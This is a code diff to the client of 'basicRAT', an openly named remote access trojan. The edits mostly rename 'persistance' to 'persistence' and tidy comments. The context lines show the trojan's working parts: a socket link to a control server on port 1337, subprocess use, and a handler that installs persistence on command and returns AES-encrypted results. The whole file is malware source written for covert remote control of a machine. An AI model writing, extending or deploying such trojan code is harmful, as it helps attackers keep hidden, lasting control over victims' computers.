@@ -1,19 +1,21 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 
+#
+# basicRAT client
+# https://github.com/vesche/basicRAT
+#
+
 import socket
 import subprocess
 import sys
 
-# from Crypto import Random
-# from Crypto.Cipher import AES
-
 # from core import crypto
-from core import persistance
-
+from core import persistence
 # temporary
 from core.crypto import AES_encrypt as encrypt
 from core.crypto import AES_decrypt as decrypt
+
 
 HOST = 'localhost'
 PORT = 1337
@@ -62,13 +64,15 @@ def main():
                 if results == '':
                     break
 
-        elif cmd == 'persistance':
-            success, details = persistance.run()
+        # apply persistence mechanism
+        elif cmd == 'persistence':
+            success, details = persistence.run()
             if success:
-                results = 'Persistance successful, {}'.format(details)
+                results = 'Persistence successful, {}'.format(details)
             else:
-                results = 'Persistance unsuccessufl, {}'.format(details)
+                results = 'Persistence unsuccessful, {}'.format(details)
             s.send(encrypt(results))
+
 
 if __name__ == '__main__':
     main()
